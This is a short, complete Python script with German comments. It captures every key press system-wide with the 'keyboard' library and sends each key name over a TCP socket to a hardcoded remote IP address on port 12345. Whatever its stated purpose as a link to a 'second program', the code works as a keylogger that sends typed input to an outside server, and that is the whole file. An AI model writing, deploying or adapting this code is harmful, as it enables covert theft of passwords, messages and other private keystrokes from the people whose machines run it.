import socket
import keyboard  

def main():
    # Einstellungen für die Verbindung
    host = '85.214.122.18'  # Ändern Sie dies auf die IP-Adresse des zweiten Programms, wenn es auf einem anderen Computer läuft
    port = 12345

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            client_socket.connect((host, port))
            print("Verbunden mit dem Server.")

            while True:
                key_event = keyboard.read_event()
                if key_event.event_type == keyboard.KEY_DOWN:
                    key_pressed = key_event.name
                    client_socket.sendall(key_pressed.encode())
                    print(f"Taste gedrückt: {key_pressed}")

        except KeyboardInterrupt:
            print("\nVerbindung wurde getrennt.")
        except ConnectionRefusedError:
            print("Verbindung zum Server wurde abgelehnt. Stellen Sie sicher, dass der Server läuft.")

if __name__ == "__main__":
    main()
